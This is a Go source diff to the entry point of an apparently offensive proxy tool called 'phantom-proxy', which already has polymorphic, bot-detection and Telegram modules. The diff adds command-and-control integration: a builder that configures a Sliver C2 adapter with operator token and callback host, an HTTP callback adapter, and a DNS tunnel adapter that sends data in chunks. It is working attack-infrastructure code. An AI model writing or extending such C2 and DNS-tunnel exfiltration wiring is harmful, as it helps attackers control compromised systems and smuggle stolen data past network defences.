@@ -13,17 +13,20 @@ import (
 	"go.uber.org/zap"
 	"go.uber.org/zap/zapcore"
 
-	"github.com/phantom-proxy/phantom-proxy/internal/config"
-	"github.com/phantom-proxy/phantom-proxy/internal/database"
-	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
 	"github.com/phantom-proxy/phantom-proxy/internal/api"
+	"github.com/phantom-proxy/phantom-proxy/internal/config"
+	"github.com/phantom-proxy/phantom-proxy/internal/c2"
+	"github.com/phantom-proxy/phantom-proxy/internal/database"
+	"github.com/phantom-proxy/phantom-proxy/internal/events"
 	"github.com/phantom-proxy/phantom-proxy/internal/ml"
-	"github.com/phantom-proxy/phantom-proxy/internal/telegram"
+	"github.com/phantom-proxy/phantom-proxy/internal/modules"
 	"github.com/phantom-proxy/phantom-proxy/internal/polymorphic"
+	"github.com/phantom-proxy/phantom-proxy/internal/proxy"
+	"github.com/phantom-proxy/phantom-proxy/internal/telegram"
 )
 
 const (
-	Version = "1.0.0-dev"
+	Version = "13.0.0"
 	Banner  = `
 ██████╗  ██████╗ ██╗     ██╗     ██╗███╗   ██╗ ██████╗ 
 ██╔══██╗██╔═══██╗██║     ██║     ██║████╗  ██║██╔════╝ 
@@ -102,11 +105,23 @@ func main() {
 		botDetector := ml.NewBotDetector(logger, cfg.MLThreshold)
 		logger.Info("ML Bot Detector initialized",
 			zap.Float32("threshold", cfg.MLThreshold))
-		
+
 		// Передаём детектор в прокси
 		httpProxy.SetBotDetector(botDetector)
 	}
-	
+
+	// PhantomProxy v13: Event Bus и C2 интеграция
+	eventBus := events.NewBus()
+	httpProxy.SetEventBus(eventBus)
+
+	c2Manager := buildC2Manager(&cfg.V13)
+	c2Module := modules.NewC2IntegrationModule(c2Manager, db, logger)
+	if err := c2Module.Init(context.Background(), eventBus); err != nil {
+		logger.Warn("C2 integration module init failed", zap.Error(err))
+	} else {
+		logger.Info("PhantomProxy v13 C2 integration ready")
+	}
+
 	// Контекст для graceful shutdown
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -169,6 +184,58 @@ func main() {
 	
 	logger.Info("PhantomProxy stopped")
 	color.Green("\n[*] Shutdown complete")
+}
+
+func buildC2Manager(v13 *config.V13Config) *c2.Manager {
+	var adapters []c2.Adapter
+	if m, ok := v13.C2["sliver"].(map[string]interface{}); ok && m != nil {
+		if en, _ := m["enabled"].(bool); en {
+			adapters = append(adapters, c2.NewSliverAdapter(&c2.SliverConfig{
+				Enabled:       true,
+				ServerURL:     getStr(m, "server_url"),
+				OperatorToken: getStr(m, "operator_token"),
+				CallbackHost:  getStr(m, "callback_host"),
+			}))
+		}
+	}
+	if m, ok := v13.C2["http_callback"].(map[string]interface{}); ok && m != nil {
+		if en, _ := m["enabled"].(bool); en {
+			var headers []string
+			if h, ok := m["headers"].([]interface{}); ok {
+				for _, v := range h {
+					if s, ok := v.(string); ok {
+						headers = append(headers, s)
+					}
+				}
+			}
+			adapters = append(adapters, c2.NewHTTPCallbackAdapter(&c2.HTTPCallbackConfig{
+				Enabled:     true,
+				CallbackURL: getStr(m, "callback_url"),
+				Headers:     headers,
+			}))
+		}
+	}
+	if m, ok := v13.C2["dns_tunnel"].(map[string]interface{}); ok && m != nil {
+		if en, _ := m["enabled"].(bool); en {
+			chunk := 60
+			if c, ok := m["chunk_size"].(int); ok {
+				chunk = c
+			}
+			adapters = append(adapters, c2.NewDNSTunnelAdapter(&c2.DNSTunnelConfig{
+				Enabled: true,
+				Domain:  getStr(m, "domain"),
+				ChunkSize: chunk,
+			}))
+		}
+	}
+	return c2.NewManager(adapters...)
+}
+
+func getStr(m map[string]interface{}, key string) string {
+	if v, ok := m[key].(string); ok {
+		return v
+	}
+	return ""
 }
 
 func initLogger(debug bool) (*zap.Logger, error) {
